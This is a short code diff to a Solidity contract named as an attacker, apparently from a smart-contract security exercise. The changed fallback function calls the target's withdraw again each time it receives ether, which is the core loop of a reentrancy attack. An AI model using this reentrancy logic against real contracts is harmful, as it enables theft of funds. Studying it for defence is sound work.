@@ -40,8 +40,8 @@ contract OptimizedAttackerSecurity102 {
     }
 
     fallback() external payable {
-        if (address(this).balance == 1 ether) {
-            Target(msg.sender).withdraw(1 ether);
+        if (address(this).balance == msg.value) {
+            Target(msg.sender).withdraw(msg.value);
         }
     }
 }
